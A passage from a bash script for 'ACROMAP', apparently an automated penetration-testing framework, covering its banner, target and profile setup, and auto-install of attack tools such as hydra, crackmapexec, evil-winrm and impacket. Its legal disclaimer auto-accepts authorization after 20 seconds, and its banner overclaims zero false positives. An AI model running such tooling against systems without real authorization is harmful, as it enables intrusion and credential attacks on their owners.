        $(( total_elapsed/60 )) $(( total_elapsed%60 )) $(( total_remaining/60 )) $(( total_remaining%60 ))
    echo "  ╠══════════════════════════════════════════════════════════════════╣"
    printf "  ║  0DAY:%-3s  1CLICK:%-3s  CRIT:%-3s  HIGH:%-3s  MED:%-3s  INFO:%-3s ║\n" \
        "$ZERO_DAY_COUNT" "$ONE_CLICK_COUNT" "$CRITICAL_COUNT" "$HIGH_COUNT" "$MEDIUM_COUNT" "$INFO_COUNT"
    printf "  ║  Confidence Rating : %s/10  (%s)                      ║\n" "$conf" "$(get_confidence_label "$conf")"
    printf "  ║  Tools : %s/%s succeeded     Press [D] to toggle debug         ║\n" \
        "$TOOLS_SUCCEEDED" "$TOOLS_ATTEMPTED"
    echo "  ╚══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ── Cleanup ───────────────────────────────────────────────────────────────────
cleanup() {
    local code="${1:-0}"
    # Stop spinner first (so terminal is clean)
    _spinner_stop 2>/dev/null || true
    # Restore terminal settings if keypress monitor was running (stty raw mode)
    [[ ${KEYPRESS_PID:-0} -gt 0 ]] && stty sane </dev/tty 2>/dev/null || true
    # Kill background processes
    [[ ${KEYPRESS_PID:-0} -gt 0 ]]   && kill "$KEYPRESS_PID"        2>/dev/null || true
    [[ ${INTERACTSH_PID:-0} -gt 0 ]] && kill "$INTERACTSH_PID"      2>/dev/null || true
    # Remove IPC tmpfiles
    [[ -n "${ACROMAP_DEBUG_FILE:-}" ]] && rm -f "$ACROMAP_DEBUG_FILE" 2>/dev/null || true
    [[ -n "${ACROMAP_STATUS_REQ:-}"  ]] && rm -f "$ACROMAP_STATUS_REQ" 2>/dev/null || true
    # Only print error message for real failures (not normal exit 0, not Ctrl+C 130)
    if [[ $code -ne 0 && $code -ne 130 && $code -ne 143 ]]; then
        echo -e "\n  ${LRED}[!] Script terminated (signal/code ${code}). Partial results saved in: ${OUTPUT_DIR:-<not set>}${NC}" >&2
        echo -e "  ${YELLOW}[!] Tip: Re-run with --resume to continue from last checkpoint.${NC}" >&2
    elif [[ $code -eq 130 ]]; then
        echo -e "\n  ${YELLOW}[!] Scan interrupted by user (Ctrl+C). Results saved in: ${OUTPUT_DIR:-<not set>}${NC}" >&2
    fi
}
# Ctrl+C / SIGTERM — set flag then exit cleanly
_ACROMAP_INTERRUPTED=false
_acromap_int_handler() {
    # IMMEDIATELY reset both traps to prevent re-entry on repeated Ctrl+C presses
    trap '' INT TERM
    trap '' EXIT
    # Guard against re-entry
    [[ "$_ACROMAP_INTERRUPTED" == true ]] && exit 130
    _ACROMAP_INTERRUPTED=true
    # Stop spinner (clears the animation line)
    _spinner_stop 2>/dev/null || true
    echo -e "\n\n  ${YELLOW}[!] Ctrl+C — stopping scan. Saving partial results...${NC}" >/dev/tty 2>/dev/null || echo ""
    # Kill just the direct child processes, not the whole group
    cleanup 130
    echo -e "  ${LGREEN}[✓] Partial results saved in: ${OUTPUT_DIR:-<not set>}${NC}" >/dev/tty 2>/dev/null || echo ""
    exit 130
}
trap '_acromap_int_handler' INT TERM
trap 'cleanup $?' EXIT

# ── Banner ────────────────────────────────────────────────────────────────────
print_banner() {
    clear
    echo -e "\n  \033[1;36m╔══════════════════════════════════════════════════════════════════════════════╗\033[0m"
    echo -e "  \033[1;36m║\033[0m \033[1;95m  ██████╗   ██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗             \033[0m \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m \033[1;95m ██╔═══██╗ ██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔══██╗            \033[0m \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m \033[1;35m ███████║ ██║      ██████╔╝██║   ██║██╔████╔██║███████║██████╔╝             \033[0m \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m \033[1;35m ██╔══██║ ██║      ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝              \033[0m \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m \033[1;34m ██║  ██║ ╚██████╗ ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║                  \033[0m \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m \033[1;34m ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝                  \033[0m \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m                                                                              \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m      \033[1;32mv5.0   \033[1;90m|\033[1;36m   32-PHASE ADVANCED EXPLOITATION FRAMEWORK   \033[1;90m|\033[1;32m   acro77x       \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m     \033[1;90m════════════════════════════════════════════════════════════════════     \033[1;36m║\033[0m"
    echo -e "  \033[1;36m║\033[0m     \033[1;31m100% EXPLOITABILITY CONFIRMED \033[1;90m•\033[1;33m ZERO FALSE POSITIVES \033[1;90m•\033[1;36m PARALLEL   \033[0m     \033[1;36m║\033[0m"
    echo -e "  \033[1;36m╚══════════════════════════════════════════════════════════════════════════════╝\033[0m"
    echo -e "  \033[1;90mRuntime  : \033[1;37m$(date '+%H:%M:%S  |  %d %b %Y')\033[0m"
    echo -e "  \033[1;90mContext  : \033[1;36m$(whoami)\033[1;90m @ \033[1;36m$(hostname)\033[0m"
    echo -e "  \033[1;90mHotkeys  : \033[1;33m[T]\033[1;37m Live Status Tracker  \033[1;90m•\033[1;33m  [D]\033[1;37m Debug Verbosity\033[0m\n"
}

# ── Disclaimer ────────────────────────────────────────────────────────────────
show_disclaimer() {
    echo -e "${LRED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════════════════════╗"
    echo "  ║                                                                      ║"
    echo "  ║                    ⚠  LEGAL DISCLAIMER  ⚠                           ║"
    echo "  ╠══════════════════════════════════════════════════════════════════════╣"
    echo "  ║                                                                      ║"
    echo "  ║  ACROMAP is an open-source educational tool.                         ║"
    echo "  ║                                                                      ║"
    echo "  ║  THE AUTHOR (acro77x) IS NOT RESPONSIBLE OR LIABLE for any           ║"
    echo "  ║  illegal, unauthorized, or unethical use of this tool.               ║"
    echo "  ║                                                                      ║"
    echo "  ║  Unauthorized scanning of systems you do NOT own is illegal under:   ║"
    echo "  ║    • IT Act 2000 (India) — Section 43, 66, 66B                       ║"
    echo "  ║    • Computer Fraud & Abuse Act (CFAA) — USA                         ║"
    echo "  ║    • Computer Misuse Act 1990 — UK                                   ║"
    echo "  ║    • Equivalent laws in 190+ countries                               ║"
    echo "  ║                                                                      ║"
    echo "  ║  By continuing you confirm written authorization to test target.     ║"
    echo "  ╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"

    # 20-second countdown — user has full time to read the disclaimer
    echo ""
    echo -e "  ${WHITE}Read the above carefully. Auto-accepting in 20 seconds.${NC}"
    echo -e "  ${WHITE}Press ${LGREEN}ENTER${WHITE} to accept | Type ${LRED}no${WHITE}+ENTER to reject and exit.${NC}"
    echo ""
    local _secs=20
    while [[ ${_secs:-0} -gt 0 ]]; do
        # Overwrite same line with countdown bar
        local _bar_filled=$(( (20 - _secs) * 30 / 20 ))
        local _bar_empty=$(( 30 - _bar_filled ))
        local _bar=""
        for (( _bi=0; _bi<_bar_filled; _bi++ )); do _bar+="█"; done
        for (( _bi=0; _bi<_bar_empty;  _bi++ )); do _bar+="░"; done
        printf "
  ${YELLOW}[%s]${NC} %2ds remaining — ENTER=accept  no=reject  " "$_bar" "$_secs" >/dev/tty 2>/dev/null ||         printf "
  [%s] %2ds remaining — ENTER=accept  no=reject  " "$_bar" "$_secs"
        # Non-blocking 1-second read
        if IFS= read -r -t 1 _disc_ans 2>/dev/null; then
            echo ""
            if [[ "${_disc_ans,,}" == "n"* ]]; then
                echo -e "
  ${LRED}[✗] Disclaimer rejected. Exiting safely.${NC}"
                exit 0
            fi
            break   # ENTER or any other = accept
        fi
        _secs=$(( _secs - 1 ))
    done
    echo ""
    log_ok "Disclaimer accepted. Proceeding."
    sleep 0.5
    echo ""
    echo -e "${LGREEN}${BOLD}  ════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${LGREEN}${BOLD}  ACROMAP v5.0  |  32-Phase Auto Pentester  |  ${CYAN}Starting setup...${LGREEN}${NC}"
    echo -e "${LGREEN}${BOLD}  ════════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# ── Target configuration ──────────────────────────────────────────────────────
get_target() {
    echo -e "\n${LCYAN}${BOLD}"
    echo "  ╔════════════════════════════════════════════╗"
    echo "  ║        TARGET CONFIGURATION                ║"
    echo "  ╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "  ${WHITE}Host     : ${CYAN}$(whoami)@$(hostname)${NC}"
    echo -e "  ${WHITE}Kernel   : ${CYAN}$(uname -r 2>/dev/null || echo unknown)${NC}"
    echo -e "  ${WHITE}Date     : ${CYAN}$(date)${NC}"
    echo ""
    echo -e "  ${DIM}Accepted formats:${NC}"
    echo -e "  ${DIM}  Single IP   : 10.10.10.5${NC}"
    echo -e "  ${DIM}  Domain      : tryhackme.com / example.com / target.htb${NC}"
    echo -e "  ${DIM}  CIDR Range  : 192.168.1.0/24  (multi-host sweep)${NC}"
    echo ""

    # Check for resume
    local scan_base="${SCRIPT_DIR}/acromap_results"
    # Collect all checkpoints into an indexed array
    local -a _cps=()
    while IFS= read -r _cp; do
        [[ -f "$_cp" ]] && _cps+=("$_cp")
    done < <(ls "${scan_base}"/*/.checkpoint 2>/dev/null)

    if [[ ${#_cps[@]} -gt 0 ]]; then
        echo -e "  ${YELLOW}[!]${NC} Previous scan checkpoints found:"
        local _idx=1
        for _cp in "${_cps[@]}"; do
            local _dir; _dir=$(dirname "$_cp")
            local _tgt; _tgt=$(grep -m1 "^TARGET=" "$_cp" 2>/dev/null | sed 's/^TARGET=//' | tr -d '"\'\ || echo "")
            [[ -z "$_tgt" ]] && _tgt=$(basename "$(dirname "$_cp")" | sed 's/_[0-9]*_[0-9]*$//')
            local _saved; _saved=$(grep "^SAVED=" "$_cp" 2>/dev/null | cut -d= -f2 || echo "")
            local _phase; _phase=$(grep "^LAST_PHASE=" "$_cp" 2>/dev/null | cut -d= -f2 || echo "0")
            echo -e "    ${YELLOW}[${_idx}]${NC} ${CYAN}${_tgt}${NC}  — phase ${_phase}/31 completed  ${DIM}${_saved}${NC}"
            _idx=$(( _idx + 1 ))
        done
        echo -e "    ${YELLOW}[0]${NC} Start fresh scan"
        echo ""
        echo ""
        echo -ne "  ${YELLOW}Select checkpoint to resume [0-$((${#_cps[@]}))]:${NC} (auto-fresh in 45s): "
        local _choice
        read -r -t 45 _choice || _choice="0"
        _choice="${_choice// /}"
        # Validate numeric choice
        if [[ "$_choice" =~ ^[1-9][0-9]*$ ]] && [[ $_choice -le ${#_cps[@]} ]]; then
            local _chosen="${_cps[$(( _choice - 1 ))]}"
            RESUME_MODE=true
            if load_checkpoint "$_chosen"; then
                log_ok "Resumed: ${TARGET} from phase ${LAST_PHASE:-0}"
            else
                log_warn "Checkpoint corrupt — starting fresh"
                RESUME_MODE=false
            fi
        else
            log_info "Starting fresh scan."
            RESUME_MODE=false
        fi
    fi

    if [[ "$RESUME_MODE" == false ]]; then
        while true; do
            echo -ne "  ${YELLOW}Enter target IP / CIDR / domain${NC} (300s timeout): "
            read -r -t 300 TARGET || { log_error "No target entered — exiting."; exit 1; }
            TARGET="${TARGET// /}"
            # Strip protocol prefix; if it had one, also strip any trailing path
            local _raw_input="$TARGET"
            if [[ "$_raw_input" == http://* || "$_raw_input" == https://* ]]; then
                TARGET="${_raw_input#http://}"
                TARGET="${TARGET#https://}"
                TARGET="${TARGET%%/*}"   # strip /path — safe: http:// inputs are never CIDR
            fi

            if [[ -z "$TARGET" ]]; then
                log_error "Target cannot be empty."
                continue
            fi

            # Strip http/https and trailing path, but keep CIDR slash
            local raw="$TARGET"
            # CIDR: x.x.x.x/y
            if [[ "$raw" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
                TARGET_TYPE="CIDR"
                TARGET_IS_CIDR=true
                log_ok "Target set: ${TARGET} (CIDR range)"
                # Expand CIDR with nmap -sL (list only, no scan)
                if command -v nmap &>/dev/null; then
                    log_info "Expanding CIDR range..."
                    while IFS= read -r h; do
                        [[ "$h" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && CIDR_HOSTS+=("$h")
                    done < <(nmap -sL -n "$raw" 2>/dev/null | grep "Nmap scan report" | awk '{print $NF}')
                    log_ok "CIDR expanded: ${#CIDR_HOSTS[@]} hosts in range"
                    if [[ ${#CIDR_HOSTS[@]} -gt 254 ]]; then
                        log_warn "Large range (${#CIDR_HOSTS[@]} hosts) — consider /24 or smaller for performance"
                    fi
                fi
                break
            # IPv4
            elif [[ "$raw" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                TARGET_TYPE="IP"
                TARGET_IS_CIDR=false
                CIDR_HOSTS=("$raw")
                log_ok "Target set: ${TARGET} (IP)"
                break
            # Domain
            elif [[ "$raw" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$ ]]; then
                TARGET_TYPE="DOMAIN"
                TARGET_IS_CIDR=false
                CIDR_HOSTS=("$raw")
                log_ok "Target set: ${TARGET} (Domain)"
                break
            else
                log_error "Invalid format. Use: IP (1.2.3.4) | CIDR (1.2.3.0/24) | Domain (target.lab)"
            fi
        done
    fi
}

# ── Profile selection ─────────────────────────────────────────────────────────
get_profile() {
    # BUG FIX: when resuming, SCAN_PROFILE and OUTPUT_DIR are already restored by load_checkpoint.
    # Only ask for profile and create directories for fresh scans.
    if [[ "$RESUME_MODE" == true && -n "$OUTPUT_DIR" ]]; then
        log_ok "Resuming scan — Profile: ${SCAN_PROFILE} | Output: ${OUTPUT_DIR}"
        # Ensure all subdirs still exist (may have been cleaned)
        mkdir -p "${OUTPUT_DIR}"/{nmap,masscan,rustscan,nikto,gobuster,feroxbuster,ffuf,dirb,\
whatweb,wafw00f,sslscan,sslyze,whois,dns,subdomains,httpx,nuclei,wpscan,droopescan,\
joomscan,cmseek,sqlmap,dalfox,xsstrike,commix,enum4linux,crackmapexec,smbmap,\
hydra,theharvester,shodan,curl,arjun,api,cve_checks,post_exploit,raw_logs,reports,\
metasploit,zap,cloud_enum,kubernetes,password_spray,cidr_hosts,\
cors_jwt,ssrf_deep,secrets,ad_attacks,gf_output,hakrawler,bypass403} 2>/dev/null
        LOG_FILE="${OUTPUT_DIR}/acromap_debug.log"
        CHECKPOINT_FILE="${OUTPUT_DIR}/.checkpoint"
        MSF_RC_FILE="${OUTPUT_DIR}/metasploit/exploit.rc"
        echo "[$(date '+%H:%M:%S')] ===== SCAN RESUMED =====" >> "$LOG_FILE"
        return 0
    fi

    echo -e "\n${LCYAN}${BOLD}"
    echo "  ╔════════════════════════════════════════════╗"
    echo "  ║        SCAN PROFILE SELECTION              ║"
    echo "  ╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "  ${BOLD}[1]${NC} ${LGREEN}Quick${NC}    — Core phases, top ports, fast recon        (~15 min)"
    echo -e "  ${BOLD}[2]${NC} ${YELLOW}Standard${NC} — All 31 phases, full port scan, deep web    (~45 min)"
    echo -e "  ${BOLD}[3]${NC} ${LRED}Deep${NC}     — Max depth, all tools, brute force enabled  (~2+ hrs)"
    echo ""
    echo -ne "  ${YELLOW}Select profile [1/2/3] (auto-standard in 30s): ${NC}"
    read -r -t 30 profile_choice || profile_choice="2"
    case "$profile_choice" in
        1) SCAN_PROFILE="quick";    log_ok "Profile: Quick" ;;
        3) SCAN_PROFILE="deep";     log_ok "Profile: Deep" ;;
        *) SCAN_PROFILE="standard"; log_ok "Profile: Standard" ;;
    esac

    # Create output directory
    OUTPUT_DIR="${SCRIPT_DIR}/acromap_results/${TARGET}_${TIMESTAMP}"
    mkdir -p "${OUTPUT_DIR}"/{nmap,masscan,rustscan,nikto,gobuster,feroxbuster,ffuf,dirb,\
whatweb,wafw00f,sslscan,sslyze,whois,dns,subdomains,httpx,nuclei,wpscan,droopescan,\
joomscan,cmseek,sqlmap,dalfox,xsstrike,commix,enum4linux,crackmapexec,smbmap,\
hydra,theharvester,shodan,curl,arjun,api,cve_checks,post_exploit,raw_logs,reports,\
metasploit,zap,cloud_enum,kubernetes,password_spray,cidr_hosts,\
cors_jwt,ssrf_deep,secrets,ad_attacks,gf_output,hakrawler,bypass403} 2>/dev/null
    LOG_FILE="${OUTPUT_DIR}/acromap_debug.log"
    CHECKPOINT_FILE="${OUTPUT_DIR}/.checkpoint"
    MSF_RC_FILE="${OUTPUT_DIR}/metasploit/exploit.rc"
    echo "# ACROMAP v5.0 — Debug Log" > "$LOG_FILE"
    echo "# Target: ${TARGET}  |  Profile: ${SCAN_PROFILE}  |  Date: $(date)" >> "$LOG_FILE"
    echo "# ════════════════════════════════════════" >> "$LOG_FILE"
    log_ok "Output directory: ${OUTPUT_DIR}"
    # Print compact persistent status line so banner stays readable during setup
    echo ""
    echo -e "${LCYAN}${BOLD}  ╔═════════════════════════════════════════════════════════════════╗"
    echo    "  ║  ACROMAP v5.0 — 32-Phase Pentest Framework — Starting...       ║"
    printf  "  ║  Target: %-30s Profile: %-12s║\n" "${TARGET}" "${SCAN_PROFILE}"
    echo    "  ╚═════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"

    # Notification setup
    echo ""
    echo -e "  ${LCYAN}${BOLD}── Notification Setup (optional) ──${NC}"
    echo -ne "  ${YELLOW}Enable Slack notification on completion? [y/N] (auto-N in 10s): ${NC}"
    read -r -t 10 slack_ans || slack_ans="N"
    if [[ "${slack_ans,,}" == "y" ]]; then
        echo -ne "  Enter Slack webhook URL (30s): "
        read -r -t 30 SLACK_WEBHOOK || SLACK_WEBHOOK=""
        if [[ -n "$SLACK_WEBHOOK" ]]; then
            NOTIFY_SLACK=true
            log_ok "Slack notifications enabled"
        fi
    fi
    echo -ne "  ${YELLOW}Enable email notification on completion? [y/N] (auto-N in 10s): ${NC}"
    read -r -t 10 email_ans || email_ans="N"
    if [[ "${email_ans,,}" == "y" ]]; then
        echo -ne "  Enter recipient email address (30s): "
        read -r -t 30 NOTIFY_EMAIL_ADDR || NOTIFY_EMAIL_ADDR=""
        if [[ -n "$NOTIFY_EMAIL_ADDR" ]]; then
            NOTIFY_EMAIL=true
            log_ok "Email notifications enabled → ${NOTIFY_EMAIL_ADDR}"
        fi
    fi
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 0 — SETUP & TOOL VERIFICATION
# ════════════════════════════════════════════════════════════════════════════════
phase_setup() {
    log_phase 0 "${PHASE_NAMES[0]}"
    chmod +x "$0" 2>/dev/null || true

    # OS detection
    local os_name="Unknown"
    if grep -qi "kali" /etc/os-release 2>/dev/null; then
        os_name="Kali Linux"; echo -e "  ${LGREEN}[✓]${NC} ${BOLD}Kali Linux${NC} detected — optimal environment"
    elif grep -qi "parrot" /etc/os-release 2>/dev/null; then
        os_name="Parrot OS";  echo -e "  ${LGREEN}[✓]${NC} ${BOLD}Parrot OS${NC} detected — compatible"
    elif grep -qiE "ubuntu|debian" /etc/os-release 2>/dev/null; then
        os_name="Debian/Ubuntu"; echo -e "  ${YELLOW}[!]${NC} ${os_name} — some tools may need manual install"
    else
        echo -e "  ${YELLOW}[!]${NC} Non-Kali system — some tools may be unavailable"
    fi

    # Root check — by this point sudo escalation already happened at script top
    if [[ $EUID -ne 0 ]]; then
        log_warn "Running without root — masscan, SYN scan, and auto-install will be skipped."
    else
        log_ok "Running as root — full capabilities available"
    fi

    # Tool list (apt packages + go/pip tools)
    local -a REQUIRED_TOOLS=(
        nmap masscan nikto gobuster ffuf dirb whatweb wafw00f sslscan
        whois curl wget git python3 python3-pip netcat-openbsd
        dnsutils dnsenum enum4linux smbclient onesixtyone snmp
        sqlmap hydra wpscan nuclei theharvester wkhtmltopdf
        sublist3r feroxbuster crackmapexec smbmap arjun commix
        sslyze dalfox rustscan httpx subfinder dnsx amass katana
        gau waybackurls wfuzz joomscan droopescan cmseek xsstrike
        impacket-scripts kerbrute evil-winrm
        jq anew hakrawler gf trufflehog notify interactsh-client
        impacket-GetUserSPNs impacket-GetNPUsers certipy-ad
        parallel ldapdomaindump
    )

    local -a MISSING=() FOUND=()
    log_section "Tool inventory..."
    for pkg in "${REQUIRED_TOOLS[@]}"; do
        local bin="$pkg"
        case "$pkg" in
            dnsutils)         bin="dig" ;;
            netcat-openbsd)   bin="nc" ;;
            python3-pip)      bin="pip3" ;;
            impacket-scripts) bin="impacket-samrdump" ;;
            # BUG FIX: evil-winrm — both branches previously set bin="evil-winrm"; check .rb variant
            evil-winrm)
                if command -v evil-winrm &>/dev/null; then bin="evil-winrm"
                elif command -v evil-winrm.rb &>/dev/null; then bin="evil-winrm.rb"
                else bin="evil-winrm"; fi ;;
            # BUG FIX: crackmapexec replaced by netexec (nxc) on modern Kali — check all aliases
            crackmapexec)
                if command -v crackmapexec &>/dev/null; then bin="crackmapexec"
                elif command -v cme &>/dev/null; then bin="cme"
                elif command -v nxc &>/dev/null; then bin="nxc"
                else bin="crackmapexec"; fi ;;
            # New v5.0 tool aliases
            impacket-GetUserSPNs)  bin="GetUserSPNs.py"  ;;
            impacket-GetNPUsers)   bin="GetNPUsers.py"   ;;
            certipy-ad)            bin="certipy"         ;;
            ldapdomaindump)        bin="ldapdomaindump"  ;;
            interactsh-client)     bin="interactsh-client" ;;
            notify)                bin="notify"          ;;
            hakrawler)             bin="hakrawler"       ;;
            gf)                    bin="gf"              ;;
            trufflehog)            bin="trufflehog"      ;;
        esac
        if command -v "$bin" &>/dev/null; then
            FOUND+=("$pkg")
            printf "    ${LGREEN}✓${NC}  %-28s installed\n" "$bin"
        else
            MISSING+=("$pkg")
            printf "    ${YELLOW}✗${NC}  %-28s missing\n" "$bin"
        fi
    done

    if [[ ${#MISSING[@]} -gt 0 ]]; then
        echo ""
        log_warn "${#MISSING[@]} tools missing. Attempting auto-install..."
        if [[ ${EUID:-0} -eq 0 ]]; then
            export DEBIAN_FRONTEND=noninteractive
            echo -e "  ${CYAN}[→]${NC} Updating apt package cache..."
            printf "  \033[2m[apt]\033[0m updating package cache... "
            timeout 120 apt-get update -qq 2>/dev/null || true
            printf "\033[32m✓\033[0m\n"
            echo -e "  ${LGREEN}✓ apt cache updated${NC}"

            # ── Ensure Go is available for go install commands ────────────────
            local GOPATH_BIN=""
            if command -v go &>/dev/null; then
                GOPATH_BIN="$(go env GOPATH 2>/dev/null)/bin"
                export PATH="${PATH}:${GOPATH_BIN}"
                log_ok "Go found: $(go version 2>/dev/null | awk '{print $3}') — GOPATH/bin: ${GOPATH_BIN}"
            else
                log_warn "Go not found — installing golang-go for Go-based tools..."
                DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq golang-go 2>/dev/null || true
                if command -v go &>/dev/null; then
                    GOPATH_BIN="$(go env GOPATH 2>/dev/null)/bin"
                    export PATH="${PATH}:${GOPATH_BIN}"
                    log_ok "Go installed: $(go version 2>/dev/null | awk '{print $3}')"
                else
                    log_warn "Go install failed — Go-based tools will be skipped"
                fi
            fi

            # ── [HARDENED] apt lock-file detection ─────────────────────────────
            _wait_for_apt_lock() {
                local _count=0
                while fuser /var/lib/dpkg/lock-frontend /var/lib/apt/lists/lock &>/dev/null; do
                    if (( _count >= 30 )); then log_warn "apt is locked by another process. Proceeding anyway (may fail)..."; break; fi
                    _spinner_tick "waiting for apt lock (${_count}s)"
                    sleep 1
                    (( _count++ ))
                done
            }

            # ── [HARDENED] apt install helper ──────────────────────────────────
            _apt_install() {
                local pkg="$1" is_core="${2:-false}"
                local _timeout=90; [[ "$is_core" == true ]] && _timeout=180
                _wait_for_apt_lock
                _spinner_start "apt install ${pkg}"
                if DEBIAN_FRONTEND=noninteractive timeout "$_timeout" apt-get install -y -qq "$pkg" &>/dev/null 2>&1; then
                    _spinner_stop 2>/dev/null || true
                    printf "  \033[32m[✓]\033[0m %s installed\n" "$pkg"
                    return 0
                else
                    _spinner_stop 2>/dev/null || true
                    # Retry once after update
                    log_warn "${pkg} failed. Retrying after update..."
                    DEBIAN_FRONTEND=noninteractive timeout 60 apt-get update -qq &>/dev/null 2>&1 || true
                    if DEBIAN_FRONTEND=noninteractive timeout "$_timeout" apt-get install -y -qq "$pkg" &>/dev/null 2>&1; then
                        printf "  \033[32m✓\033[0m %s installed (retry)\n" "$pkg"
                        return 0
                    fi
                fi
                [[ "$is_core" == true ]] && log_error "CRITICAL: ${pkg} installation failed!"
                return 1
            }

            # Helper: install a Go tool and symlink to /usr/local/bin for PATH availability
            _go_install() {
                local name="$1" repo="$2" is_core="${3:-false}"
                if ! command -v go &>/dev/null; then
                    echo -e "  ${RED}[✗] go not available — skip ${name}${NC}"
                    return 1
                fi
                local _go_exit=0
                local _timeout=120; [[ "$is_core" == true ]] && _timeout=300
                _spinner_start "go install ${name}"
                timeout "$_timeout" bash -c "GOPATH=\"$(go env GOPATH)\" go install '${repo}'" 2>/dev/null || _go_exit=$?
                if [[ ${_go_exit:-0} -eq 0 ]]; then
                    local gobin="${GOPATH_BIN:-$(go env GOPATH)/bin}"
                    local binname; binname=$(basename "${repo%%@*}")
                    [[ -f "${gobin}/${binname}" ]] && ln -sf "${gobin}/${binname}" "/usr/local/bin/${binname}" 2>/dev/null || true
                    _spinner_stop 2>/dev/null
                    printf "  \033[32m✓\033[0m %s done\n" "$name"
                    return 0
                elif [[ $_go_exit -eq 124 ]]; then
                    _spinner_stop 2>/dev/null
                    log_warn "${name} timed out after ${_timeout}s. Mirror might be slow."
                    return 1
                else
                    _spinner_stop 2>/dev/null
                    log_warn "${name} failed (exit ${_go_exit})."
                    return 1
                fi
            }

            for pkg in "${MISSING[@]}"; do
                case "$pkg" in
                    # ── CORE Tools (Critical) ─────────────────────────────
                    nmap)         _apt_install "nmap" true ;;
                    httpx)        _apt_install "httpx-toolkit" true || _go_install "httpx" "github.com/projectdiscovery/httpx/cmd/httpx@latest" true ;;
                    nuclei)       _apt_install "nuclei" true || _go_install "nuclei" "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" true ;;
                    jq)           _apt_install "jq" true ;;
                    python3-pip)  _apt_install "python3-pip" true ;;

                    # ── Standard apt tools ───────────────────────────────────
                    masscan|nikto|gobuster|ffuf|dirb|whatweb|wafw00f|\
                    sslscan|whois|curl|wget|git|python3|netcat-openbsd|\
                    dnsutils|dnsenum|enum4linux|smbclient|onesixtyone|\
                    sqlmap|hydra|wpscan|sublist3r|\
                    wfuzz|impacket-scripts|\
                    evil-winrm|bloodhound)
                        _apt_install "$pkg" false ;;

                    snmp|snmp-mibs-downloader)
                        _apt_install "snmp" false
                        if command -v snmpwalk &>/dev/null; then
                            sed -i 's/^mibs :/# mibs :/' /etc/snmp/snmp.conf 2>/dev/null || true
                        fi ;;

                    # ── Pip tools ──────────────────────────────────────────
                    droopescan|xsstrike|sslyze|arjun|commix|theharvester|certipy-ad|ldapdomaindump)
                        _spinner_start "pip install ${pkg}"
                        if timeout 120 pip3 install "$pkg" --break-system-packages -q 2>/dev/null; then
                            _spinner_stop 2>/dev/null
                            printf "  \033[32m✓\033[0m %s installed\n" "$pkg"
                        else
                            _spinner_stop 2>/dev/null
                            _apt_install "$pkg" false || true
                        fi ;;

                    impacket-GetUserSPNs|impacket-GetNPUsers)
                        _apt_install "impacket-scripts" false || timeout 120 pip3 install impacket --break-system-packages -q 2>/dev/null
                        for _sc in GetUserSPNs.py GetNPUsers.py secretsdump.py psexec.py; do
                            local _sf; _sf=$(find /usr /root ~/.local /opt -name "$_sc" -type f 2>/dev/null | head -1)
                            [[ -n "$_sf" ]] && ln -sf "$_sf" "/usr/local/bin/${_sc}" 2>/dev/null && ln -sf "$_sf" "/usr/local/bin/${_sc%.py}" 2>/dev/null || true
                        done ;;

                    # ── Go tools ───────────────────────────────────────────
                    subfinder)  _apt_install "subfinder" false || _go_install "subfinder" "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" ;;
                    dnsx)       _apt_install "dnsx" false || _go_install "dnsx" "github.com/projectdiscovery/dnsx/cmd/dnsx@latest" ;;
                    amass)      _apt_install "amass" false || _go_install "amass" "github.com/owasp-amass/amass/v4/cmd/amass@latest" ;;
                    katana)     _apt_install "katana" false || _go_install "katana" "github.com/projectdiscovery/katana/cmd/katana@latest" ;;
                    gau)        _apt_install "gau" false || _go_install "gau" "github.com/lc/gau/v2/cmd/gau@latest" ;;
                    waybackurls)_apt_install "waybackurls" false || _go_install "waybackurls" "github.com/tomnomnom/waybackurls@latest" ;;
                    dalfox)     _apt_install "dalfox" false || _go_install "dalfox" "github.com/hahwul/dalfox/v2@latest" ;;
                    hakrawler)  _apt_install "hakrawler" false || _go_install "hakrawler" "github.com/hakluke/hakrawler@latest" ;;
                    gf)         _apt_install "gf" false || _go_install "gf" "github.com/tomnomnom/gf@latest" ;;

                    rustscan)
                        _apt_install "rustscan" false || {
                            local _rs_deb; _rs_deb=$(curl -s --max-time 15 "https://api.github.com/repos/RustScan/RustScan/releases/latest" 2>/dev/null | grep "browser_download_url.*amd64.deb" | head -1 | cut -d'"' -f4 || echo "")
                            if [[ -n "$_rs_deb" ]]; then
                                curl -sL --max-time 60 "$_rs_deb" -o /tmp/rustscan.deb 2>/dev/null && DEBIAN_FRONTEND=noninteractive dpkg -i /tmp/rustscan.deb &>/dev/null 2>&1
                            fi
                        } ;;

                    feroxbuster)
